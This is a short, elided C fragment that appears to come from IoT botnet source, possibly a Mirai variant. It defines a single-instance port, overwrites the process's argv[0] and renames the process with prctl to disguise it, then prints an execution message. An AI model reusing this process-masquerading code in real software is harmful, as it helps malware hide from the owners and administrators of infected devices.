...
#define SINGLE_INSTANCE_PORT 1812
...
int main(int argc, char **args)
{
    ...
    util_strcpy(args[0], HITO_NAME);
    prctl(PR_SET_NAME, HITO_NAME);

    write(1, EXEC_EXECUTE_MSG, util_strlen(EXEC_EXECUTE_MSG));
